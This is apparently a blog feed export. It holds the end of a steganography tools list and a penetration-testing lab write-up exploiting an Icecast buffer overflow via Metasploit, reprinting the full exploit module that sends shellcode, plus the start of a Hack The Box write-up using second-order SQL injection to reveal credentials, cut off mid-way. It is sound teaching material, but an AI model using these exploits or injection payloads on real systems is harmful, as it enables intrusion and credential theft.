&lt;h4 id=&quot;sonic-visualizer-is-a-tool-for-viewing-and-analyzing-the-contents-of-audio-files-however-it-can-be-helpful-when-dealing-with-audio-steganography-you-can-reveal-hidden-shapes-in-audio-files&quot;&gt;Sonic visualizer is a tool for viewing and analyzing the contents of audio files, however it can be helpful when dealing with audio steganography. You can reveal hidden shapes in audio files.&lt;/h4&gt;
&lt;h4 id=&quot;offical-website&quot;&gt;&lt;a href=&quot;https://www.sonicvisualiser.org/&quot;&gt;Offical Website&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;web-tools&quot;&gt;Web Tools&lt;/h3&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;unicode-text-steganography&quot;&gt;&lt;a href=&quot;https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder&quot;&gt;Unicode Text Steganography&lt;/a&gt;&lt;/h3&gt;
&lt;h4 id=&quot;a-web-tool-for-unicode-steganography--it-can-encode-and-decode-text&quot;&gt;A web tool for unicode steganography , it can encode and decode text.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;npiet-online&quot;&gt;&lt;a href=&quot;https://www.bertnase.de/npiet/npiet-execute.php&quot;&gt;npiet online&lt;/a&gt;&lt;/h3&gt;
&lt;h4 id=&quot;an-online-interpreter-for-piet-piet-is-an-esoteric-language--programs-in-piet-are-images-read-more-about-piet-here&quot;&gt;an online interpreter for piet. piet is an esoteric language , programs in piet are images. read more about piet &lt;a href=&quot;http://www.dangermouse.net/esoteric/piet.html&quot;&gt;here&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;dcodefr&quot;&gt;&lt;a href=&quot;https://www.dcode.fr/&quot;&gt;dcode.fr&lt;/a&gt;&lt;/h3&gt;
&lt;h4 id=&quot;sometimes-when-solving-steganography-challenges-you-will-need-to-decode-some-text-dcodefr-has-many-decoders-for-a-lot-of-ciphers-and-can-be-really-helpful&quot;&gt;Sometimes when solving steganography challenges you will need to decode some text. dcode.fr has many decoders for a lot of ciphers and can be really helpful.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;bruteforcers&quot;&gt;Bruteforcers&lt;/h3&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;stegcracker&quot;&gt;&lt;a href=&quot;https://github.com/Paradoxis/StegCracker&quot;&gt;StegCracker&lt;/a&gt;&lt;/h3&gt;
&lt;h4 id=&quot;a-tool-that-bruteforces-passwords-using-steghide&quot;&gt;A tool that bruteforces passwords using steghide&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;fcrackzip&quot;&gt;Fcrackzip&lt;/h3&gt;
&lt;h4 id=&quot;sometimes-the-extracted-data-is-a-password-protected-zip--this-tool-bruteforces-zip-archives&quot;&gt;Sometimes the extracted data is a password protected zip , this tool bruteforces zip archives.&lt;/h4&gt;
&lt;h4 id=&quot;it-can-be-installed-with-apt-however-the-source-can-be-found-on-github-4&quot;&gt;It can be installed with &lt;code class=&quot;highlighter-rouge&quot;&gt;apt&lt;/code&gt; however the &lt;a href=&quot;https://github.com/hyc/fcrackzip&quot;&gt;source&lt;/a&gt; can be found on github.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;useful-commands-8&quot;&gt;Useful commands:&lt;/h4&gt;
&lt;h4 id=&quot;fcrackzip--u--d--p-wordlisttxt-filezip--bruteforces-the-given-zip-file-with-passwords-from-the-given-wordlist&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;fcrackzip -u -D -p wordlist.txt file.zip&lt;/code&gt; : bruteforces the given zip file with passwords from the given wordlist&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;challenges&quot;&gt;Challenges&lt;/h3&gt;
&lt;h4 id=&quot;some-platforms-to-solve-stego-challenges&quot;&gt;Some platforms to solve stego challenges&lt;/h4&gt;
&lt;h4 id=&quot;hack-the-box&quot;&gt;&lt;a href=&quot;https://www.hackthebox.eu&quot;&gt;Hack The Box&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;root-me&quot;&gt;&lt;a href=&quot;https://www.root-me.org&quot;&gt;root me&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;ringerzeroctf&quot;&gt;&lt;a href=&quot;https://ringzer0ctf.com/challenges&quot;&gt;RingerZeroCTF&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;</content><author><name></name></author><summary type="html">Steganography Steganography is hiding a file or a message inside of another file , there are many fun steganography CTF challenges out there where the flag is hidden in an image , audio file or even other types of files. Here is a list of the most tools I use and some other useful resources. Note : This list will be updated regularly , feel free to pm if you have any suggestions Last update : 29.1.2019 Tools Steghide Steghide is a steganography program that hides data in various kinds of image and audio files , only supports these file formats : JPEG, BMP, WAV and AU. but it’s also useful for extracting embedded and encrypted data from other files. It can be installed with apt however the source can be found on github. Useful commands: steghide info file : displays info about a file whether it has embedded data or not. steghide extract -sf file : extracts embedded data from a file Foremost Foremost is a program that recovers files based on their headers , footers and internal data structures , I find it useful when dealing with png images. It can be installed with apt however the source can be found on github. Useful commands: foremost -i file : extracts data from the given file. Stegsolve Sometimes there is a message or a text hidden in the image itself and in order to view it you need to apply some color filters or play with the color levels. You can do it with GIMP or Photoshop or any other image editing software but stegsolve made it easier. it’s a small java tool that applies many color filters on images. Personally i find it very useful You can get it from github Strings Strings is a linux tool that displays printable strings in a file. That simple tool can be very helpful when solving stego challenges. Usually the embedded data is password protected or encrypted and sometimes the password is actaully in the file itself and can be easily viewed by using strings It’s a default linux tool so you don’t need to install anything. Useful commands: strings file : displays printable strings in the given file. Exiftool Sometimes important stuff is hidden in the metadata of the image or the file , exiftool can be very helpful to view the metadata of the files. You can get it from here Useful commands: exiftool file : shows the metadata of the given file Exiv2 A tool similar to exiftool. It can be installed with apt however the source can be found on github. Official website Useful commands: exiv2 file : shows the metadata of the given file Binwalk Binwalk is a tool for searching binary files like images and audio files for embedded files and data. It can be installed with apt however the source can be found on github. Useful commands: binwalk file : Displays the embedded data in the given file binwalk -e file : Displays and extracts the data from the given file Zsteg zsteg is a tool that can detect hidden data in png and bmp files. to install it : gem install zsteg , The source can be found on github Useful commands: zsteg -a file : Runs all the methods on the given file zsteg -E file : Extracts data from the given payload (example : zsteg -E b4,bgr,msb,xy name.png) Wavsteg WavSteg is a python3 tool that can hide data and files in wav files and can also extract data from wav files. You can get it from github Useful commands: python3 WavSteg.py -r -s soundfile -o outputfile : extracts data from a wav sound file and outputs the data into a new file Sonic visualizer Sonic visualizer is a tool for viewing and analyzing the contents of audio files, however it can be helpful when dealing with audio steganography. You can reveal hidden shapes in audio files. Offical Website Web Tools Unicode Text Steganography A web tool for unicode steganography , it can encode and decode text. npiet online an online interpreter for piet. piet is an esoteric language , programs in piet are images. read more about piet here dcode.fr Sometimes when solving steganography challenges you will need to decode some text. dcode.fr has many decoders for a lot of ciphers and can be really helpful. Bruteforcers StegCracker A tool that bruteforces passwords using steghide Fcrackzip Sometimes the extracted data is a password protected zip , this tool bruteforces zip archives. It can be installed with apt however the source can be found on github. Useful commands: fcrackzip -u -D -p wordlist.txt file.zip : bruteforces the given zip file with passwords from the given wordlist Challenges Some platforms to solve stego challenges Hack The Box root me RingerZeroCTF</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/lists/stego/0.png" /></entry><entry><title type="html">Wizard Labs - Dummy</title><link href="http://localhost:4000/wizard-labs/dummy/" rel="alternate" type="text/html" title="Wizard Labs - Dummy" /><published>2019-01-20T00:00:00+02:00</published><updated>2019-01-20T00:00:00+02:00</updated><id>http://localhost:4000/wizard-labs/dummy</id><content type="html" xml:base="http://localhost:4000/wizard-labs/dummy/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-this-is-my-write-up-about-dummy-from-wizard-labs-if-you-dont-know-them--they-are-a-new-penetration-testing-lab-they-have-16-boxes-so-far-and-dummy-is-their-first-box-to-retire-this-lab-is-nice-i-definitely-recommend-checking-it-out-dummy-is-a-windows-box-and-it-was-an-easy-one-difficulty-210-it-had-an-http-service-which-was-vulnerable-to-a-buffer-overflow--and-metasploit-had-a-module-for-it-so-this-box-can-be-done-easily-through-metasploit--i-will-show-that-then-we-will-take-a-look-at-the-exploit-and-how-its-happening-the-ip-of-the-box-is-101113-so-lets-jump-right-in&quot;&gt;Hey guys this is my write-up about Dummy from &lt;a href=&quot;https://labs.wizard-security.net/&quot;&gt;Wizard Labs&lt;/a&gt;. If you don’t know them , They are a new penetration testing lab, They have 16 boxes so far and Dummy is their first box to retire. This lab is nice I definitely recommend checking it out. Dummy is a windows box and it was an easy one (Difficulty: 2/10). It had an http service which was vulnerable to a buffer overflow , and metasploit had a module for it so this box can be done easily through metasploit . I will show that, then we will take a look at the exploit and how it’s happening. The ip of the box is 10.1.1.13 so let’s jump right in.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/dummy/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-we-always-do-we-will-start-by-scanning-the-box-with-nmap--so-&quot;&gt;As we always do we will start by scanning the box with nmap , so :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC 10.1.1.13&lt;/code&gt;
&lt;img src=&quot;/images/wizardlabs/dummy/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-see-a-lot-of-open-ports--most-of-the-http-ports-are-running-microsoft-httpapi-we-will-ignore-that-and-look-at-other-things-we-also-see-that-the-box-has-smb-which-is-an-interesting-thing-to-look-at-so-lets-try-smbmap&quot;&gt;We see a lot of open ports , most of the http ports are running Microsoft HTTPAPI, we will ignore that and look at other things. We also see that the box has smb which is an interesting thing to look at so let’s try smbmap&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smbmap -H 10.1.1.13&lt;/code&gt;
&lt;img src=&quot;/images/wizardlabs/dummy/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-immediately-get-access-denied-so-smb-is-not-helpful-here&quot;&gt;And we immediately get Access Denied so smb is not helpful here.&lt;/h4&gt;
&lt;h4 id=&quot;on-port-8000-theres-an-http-server-and-its-not-running-microsoft-httpapi--its-running-icecast-streaming-media-server-lets-check-that-port&quot;&gt;On port 8000 there’s an http server and it’s not running Microsoft HTTPAPI , it’s running &lt;a href=&quot;http://icecast.org/&quot;&gt;Icecast streaming media server&lt;/a&gt;. Let’s check that port&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;icecast&quot;&gt;Icecast&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/dummy/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;if-we-go-to-that-port-we-get-a-404-response-which-is-odd-we-can-try-bruteforcing-directories-with-dirbuster-but-that-wont-help-too-much&quot;&gt;If we go to that port we get a 404 response which is odd. We can try bruteforcing directories with dirbuster but that won’t help too much.&lt;/h4&gt;
&lt;h4 id=&quot;by-searching-online-we-will-find-that-an-old-version-of-icecast-had-a-buffer-overflow-vulnerability-which-allowed-for-a-remote-code-execution-rce-and-we-also-find-a-metasploit-module--so-lets-open-metasploit-and-search-for-icecast-modules&quot;&gt;By searching online we will find that an old version of icecast had a buffer overflow vulnerability which allowed for a remote code execution (RCE). And we also find a &lt;a href=&quot;https://www.rapid7.com/db/modules/exploit/windows/http/icecast_header&quot;&gt;metasploit module&lt;/a&gt; . So let’s open metasploit and search for icecast modules.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;metasploit&quot;&gt;Metasploit&lt;/h3&gt;
&lt;h4 id=&quot;by-doing-search-icecast-we-will-find-the-module--and-its-an-exploit-from-2004&quot;&gt;By doing &lt;code class=&quot;highlighter-rouge&quot;&gt;search icecast&lt;/code&gt; we will find the module , and it’s an exploit from 2004.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/dummy/4.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;use windows/http/icecast_header&lt;/code&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;set LHOST 10.253.xx.xx&lt;/code&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;set RHOST 10.1.1.13&lt;/code&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;exploit&lt;/code&gt;
&lt;img src=&quot;/images/wizardlabs/dummy/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-got-a-meterpreter-session-we-can-drop-a-shell-by-typing-shell-then-if-we-type-whoami-we-will-find-that-we-are-already-administrator-so-no-need-for-privilege-escalation&quot;&gt;And we got a meterpreter session. we can drop a shell by typing &lt;code class=&quot;highlighter-rouge&quot;&gt;shell&lt;/code&gt; then if we type &lt;code class=&quot;highlighter-rouge&quot;&gt;whoami&lt;/code&gt; we will find that we are already Administrator so no need for privilege escalation&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/dummy/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-can-grab-the-flags&quot;&gt;Then we can grab the flags&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/dummy/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;header-overwrite&quot;&gt;Header Overwrite&lt;/h3&gt;
&lt;h4 id=&quot;so-now-we-did-the-box--but-lets-understand-the-exploit-basically-its-a-buffer-overflow-vulnerability-it-happens-because-that-version-of-icecast-only-accepted-a-maximum-of-32-headers-in-the-http-request--so-if-a-request-had-32-headers-this-caused-the-return-address-of-the-vulnerable-function-to-be-overwritten-with-a-pointer-to-the-begining-of-the-header-number-32-this-means-that-anything-we-add-as-the-32nd-header-will-be-executed&quot;&gt;So now we did the box , but let’s understand the exploit. basically it’s a buffer overflow vulnerability, it happens because that version of icecast only accepted a maximum of 32 headers in the HTTP request , so if a request had 32 headers this caused the return address of the vulnerable function to be overwritten with a pointer to the begining of the header number 32. this means that anything we add as the 32nd header will be executed&lt;/h4&gt;
&lt;h4 id=&quot;so-if-we-make-a-request-with-31-headers-and-add-shellcode-as-the-32nd-header-we-can-get-a-reverse-shell-and-thats-what-metasploit-is-doing-but-if-we-look-at-the-source-of-the-module-&quot;&gt;So if we make a request with 31 headers and add shellcode as the 32nd header we can get a reverse shell and that’s what metasploit is doing. But if we look at the &lt;a href=&quot;https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/icecast_header.rb&quot;&gt;source&lt;/a&gt; of the module :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &amp;lt; Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           =&amp;gt; 'Icecast Header Overwrite',
      'Description'    =&amp;gt; %q{
        This module exploits a buffer overflow in the header parsing of icecast
        versions 2.0.1 and earlier, discovered by Luigi Auriemma. Sending 32
        HTTP headers will cause a write one past the end of a pointer array. On
        win32 this happens to overwrite the saved instruction pointer, and on
        linux (depending on compiler, etc) this seems to generally overwrite
        nothing crucial (read not exploitable).

        This exploit uses ExitThread(), this will leave icecast thinking the
        thread is still in use, and the thread counter won't be decremented.
        This means for each time your payload exits, the counter will be left
        incremented, and eventually the threadpool limit will be maxed. So you
        can multihit, but only till you fill the threadpool.
      },
      'Author'         =&amp;gt; [ 'spoonm', 'Luigi Auriemma &amp;lt;aluigi[at]autistici.org&amp;gt;' ],
      'License'        =&amp;gt; MSF_LICENSE,
      'References'     =&amp;gt;
        [
          [ 'CVE', '2004-1561'],
          [ 'OSVDB', '10406'],
          [ 'BID', '11271'],
          [ 'URL', 'http://archives.neohapsis.com/archives/bugtraq/2004-09/0366.html'],
        ],
      'Privileged'     =&amp;gt; false,
      'DefaultOptions' =&amp;gt;
        {
          'EXITFUNC' =&amp;gt; 'thread',
        },
      'Payload'        =&amp;gt;
        {
          'Space'    =&amp;gt; 2000,
          'BadChars' =&amp;gt; &quot;\x0d\x0a\x00&quot;,
          'DisableNops' =&amp;gt; true,
          'StackAdjustment' =&amp;gt; -3500,
        },
      'Platform'       =&amp;gt; 'win',
      'Targets'        =&amp;gt;
        [
          [ 'Automatic', { }],
        ],
      'DisclosureDate' =&amp;gt; 'Sep 28 2004',
      'DefaultTarget' =&amp;gt; 0))

    register_options(
      [
        Opt::RPORT(8000)
      ])
  end

  # Interesting that ebp is pushed after the local variables, and the line array
  # is right before the saved eip, so overrunning it just by 1 element overwrites
  # eip, making an interesting exploit....
  # .text:00414C00                 sub     esp, 94h
  # .text:00414C06                 push    ebx
  # .text:00414C07                 push    ebp
  # .text:00414C08                 push    esi

  def exploit
    connect

    # bounce bounce bouncey bounce.. (our chunk gets free'd, so do a little dance)
    # jmp 12
    evul = &quot;\xeb\x0c / HTTP/1.1 #{payload.encoded}\r\n&quot;
    evul &amp;lt;&amp;lt; &quot;Accept: text/html\r\n&quot; * 31;

    # jmp [esp+4]
    evul &amp;lt;&amp;lt; &quot;\xff\x64\x24\x04\r\n&quot;
    evul &amp;lt;&amp;lt; &quot;\r\n&quot;

    sock.put(evul)

    handler
    disconnect
  end
end

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;theres-not-much-detail-because-its-based-on-metasploit-so-luckily-i-found-this-refrence-which-had-a-poc-c-code&quot;&gt;There’s not much detail because it’s based on metasploit so luckily I found this &lt;a href=&quot;https://securitytracker.com/id/1011439&quot;&gt;refrence&lt;/a&gt; which had a poc c code.&lt;/h4&gt;
&lt;h4 id=&quot;by-looking-at-this-part-of-the-code-&quot;&gt;By looking at this part of the code :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/dummy/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-see-how-the-exploit-is-working-its-doing-a-get-request--adding-31-as-as-headers--then-the-32nd-header-is-the-shellcode&quot;&gt;We can see how the exploit is working. It’s doing a GET request , adding 31 “a”s as headers , then the 32nd header is the shellcode.&lt;/h4&gt;
&lt;h4 id=&quot;if-you-want-to-know-more-about-bufferoverflows-check-out-my-other-articles&quot;&gt;If you want to know more about bufferOverFlows check out my &lt;a href=&quot;/categories&quot;&gt;other articles&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Hey guys this is my write-up about Dummy from Wizard Labs. If you don’t know them , They are a new penetration testing lab, They have 16 boxes so far and Dummy is their first box to retire. This lab is nice I definitely recommend checking it out. Dummy is a windows box and it was an easy one (Difficulty: 2/10). It had an http service which was vulnerable to a buffer overflow , and metasploit had a module for it so this box can be done easily through metasploit . I will show that, then we will take a look at the exploit and how it’s happening. The ip of the box is 10.1.1.13 so let’s jump right in. Nmap As we always do we will start by scanning the box with nmap , so : nmap -sV -sT -sC 10.1.1.13 We see a lot of open ports , most of the http ports are running Microsoft HTTPAPI, we will ignore that and look at other things. We also see that the box has smb which is an interesting thing to look at so let’s try smbmap smbmap -H 10.1.1.13 And we immediately get Access Denied so smb is not helpful here. On port 8000 there’s an http server and it’s not running Microsoft HTTPAPI , it’s running Icecast streaming media server. Let’s check that port Icecast If we go to that port we get a 404 response which is odd. We can try bruteforcing directories with dirbuster but that won’t help too much. By searching online we will find that an old version of icecast had a buffer overflow vulnerability which allowed for a remote code execution (RCE). And we also find a metasploit module . So let’s open metasploit and search for icecast modules. Metasploit By doing search icecast we will find the module , and it’s an exploit from 2004. use windows/http/icecast_header set LHOST 10.253.xx.xx set RHOST 10.1.1.13 exploit And we got a meterpreter session. we can drop a shell by typing shell then if we type whoami we will find that we are already Administrator so no need for privilege escalation Then we can grab the flags Header Overwrite So now we did the box , but let’s understand the exploit. basically it’s a buffer overflow vulnerability, it happens because that version of icecast only accepted a maximum of 32 headers in the HTTP request , so if a request had 32 headers this caused the return address of the vulnerable function to be overwritten with a pointer to the begining of the header number 32. this means that anything we add as the 32nd header will be executed So if we make a request with 31 headers and add shellcode as the 32nd header we can get a reverse shell and that’s what metasploit is doing. But if we look at the source of the module : ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## class MetasploitModule &amp;lt; Msf::Exploit::Remote Rank = GreatRanking include Msf::Exploit::Remote::Tcp def initialize(info = {}) super(update_info(info, 'Name' =&amp;gt; 'Icecast Header Overwrite', 'Description' =&amp;gt; %q{ This module exploits a buffer overflow in the header parsing of icecast versions 2.0.1 and earlier, discovered by Luigi Auriemma. Sending 32 HTTP headers will cause a write one past the end of a pointer array. On win32 this happens to overwrite the saved instruction pointer, and on linux (depending on compiler, etc) this seems to generally overwrite nothing crucial (read not exploitable). This exploit uses ExitThread(), this will leave icecast thinking the thread is still in use, and the thread counter won't be decremented. This means for each time your payload exits, the counter will be left incremented, and eventually the threadpool limit will be maxed. So you can multihit, but only till you fill the threadpool. }, 'Author' =&amp;gt; [ 'spoonm', 'Luigi Auriemma &amp;lt;aluigi[at]autistici.org&amp;gt;' ], 'License' =&amp;gt; MSF_LICENSE, 'References' =&amp;gt; [ [ 'CVE', '2004-1561'], [ 'OSVDB', '10406'], [ 'BID', '11271'], [ 'URL', 'http://archives.neohapsis.com/archives/bugtraq/2004-09/0366.html'], ], 'Privileged' =&amp;gt; false, 'DefaultOptions' =&amp;gt; { 'EXITFUNC' =&amp;gt; 'thread', }, 'Payload' =&amp;gt; { 'Space' =&amp;gt; 2000, 'BadChars' =&amp;gt; &quot;\x0d\x0a\x00&quot;, 'DisableNops' =&amp;gt; true, 'StackAdjustment' =&amp;gt; -3500, }, 'Platform' =&amp;gt; 'win', 'Targets' =&amp;gt; [ [ 'Automatic', { }], ], 'DisclosureDate' =&amp;gt; 'Sep 28 2004', 'DefaultTarget' =&amp;gt; 0)) register_options( [ Opt::RPORT(8000) ]) end # Interesting that ebp is pushed after the local variables, and the line array # is right before the saved eip, so overrunning it just by 1 element overwrites # eip, making an interesting exploit.... # .text:00414C00 sub esp, 94h # .text:00414C06 push ebx # .text:00414C07 push ebp # .text:00414C08 push esi def exploit connect # bounce bounce bouncey bounce.. (our chunk gets free'd, so do a little dance) # jmp 12 evul = &quot;\xeb\x0c / HTTP/1.1 #{payload.encoded}\r\n&quot; evul &amp;lt;&amp;lt; &quot;Accept: text/html\r\n&quot; * 31; # jmp [esp+4] evul &amp;lt;&amp;lt; &quot;\xff\x64\x24\x04\r\n&quot; evul &amp;lt;&amp;lt; &quot;\r\n&quot; sock.put(evul) handler disconnect end end There’s not much detail because it’s based on metasploit so luckily I found this refrence which had a poc c code. By looking at this part of the code : We can see how the exploit is working. It’s doing a GET request , adding 31 “a”s as headers , then the 32nd header is the shellcode. If you want to know more about bufferOverFlows check out my other articles That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/wizardlabs/dummy/0.png" /></entry><entry><title type="html">Hack The Box - SecNotes</title><link href="http://localhost:4000/hack-the-box/secnotes/" rel="alternate" type="text/html" title="Hack The Box - SecNotes" /><published>2019-01-19T00:00:00+02:00</published><updated>2019-01-19T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/secnotes</id><content type="html" xml:base="http://localhost:4000/hack-the-box/secnotes/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-secnotes-retired-secnotes-was-a-very-nice-box-and-i-really-liked-that-it-mixed-between-windows-and-linux--and-thats-because-it-was-a-windows-box-and-it-had-windows-subsystem-for-linux-wsl-installedit-was-relatively-easy-its-ip-is-10101097-so-lets-jump-right-in&quot;&gt;Hey guys Today SecNotes retired. SecNotes was a very nice box and I really liked that it mixed between windows and linux , and that’s because it was a windows box and it had windows subsystem for linux (WSL) installed.It was relatively easy. It’s ip is 10.10.10.97 so let’s jump right in.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/secnotes/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;we-will-start-with-scanning-open-ports-and-services-with-nmap-like-we-always-do-so-nmap--sv--st-secnoteshtb&quot;&gt;We will start with scanning open ports and services with nmap like we always do so &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT secnotes.htb&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/secnotes/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-see-http-on-port-80-and-microsoft-ds-on-445-which-is-smb-actually&quot;&gt;And we see http on port 80 and microsoft-ds on 445 which is smb actually.&lt;/h4&gt;
&lt;h4 id=&quot;so-lets-look-at-whats-there-on-http&quot;&gt;So let’s look at what’s there on http&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;http&quot;&gt;HTTP&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/secnotes/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;a-regular-login-page-and-there-is-an-option-to-sign-up--so-lets-sign-up-and-see-whats-in-there&quot;&gt;A regular login page and there is an option to sign up , So let’s sign up and see what’s in there.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/secnotes/3.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/secnotes/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-we-login-we-see-this-regular-page--viewing-secure-notes-for-username--and-there-are-some-options-like-creating-a-note--changing-password--sign-out-and-contact-of-course-we-will-do-regular-enumeration-like-checking-for-directories-checking-web-vulnerabilities-and-stuff-like-that-but-i-will-just-jump-into-the-thing&quot;&gt;After we login we see this regular page : “Viewing Secure Notes for &lt;em&gt;Username&lt;/em&gt;” , and there are some options like creating a note , changing password , sign out and contact. Of course we will do regular enumeration like checking for directories ,checking web vulnerabilities and stuff like that but i will just jump into the thing.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;sqli&quot;&gt;SQLI&lt;/h3&gt;
&lt;h4 id=&quot;if-we-tried-to-do-sql-injection-in-the-registration-form--it-will-work-after-we-login-second-order-sqli-a-simple-payload-like-or-1-or-&quot;&gt;If we tried to do sql injection in the registration form , it will work after we login (second order sqli). A simple payload like &lt;code class=&quot;highlighter-rouge&quot;&gt;OR 1 OR&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/secnotes/5.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/secnotes/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-after-we-login-we-see-some-notes--most-importantly-new-site-&quot;&gt;And after we login we see some notes , most importantly “new site” :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/secnotes/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-smb-creds--so-the-next-step-is-to-login-with-smbclient&quot;&gt;We smb creds , so the next step is to login with smbclient&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
